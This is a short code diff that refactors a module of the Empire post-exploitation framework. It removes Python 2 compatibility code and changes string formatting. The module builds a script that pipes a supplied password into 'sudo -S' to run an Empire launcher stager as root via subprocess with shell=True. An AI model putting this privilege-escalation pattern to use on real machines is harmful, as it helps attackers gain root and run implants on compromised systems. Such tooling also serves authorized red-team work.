@@ -1,13 +1,10 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -38,9 +35,8 @@ class Module(object):
             launcher = launcher.replace("echo", "")
             parts = launcher.split("|")
             launcher = "python3 -c %s" % (parts[0])
-            script = (
-                'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)'
-                % (password, launcher)
+            script = 'import subprocess; subprocess.Popen("echo \\"{}\\" | sudo -S {}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)'.format(
+                password, launcher
             )
 
             return script
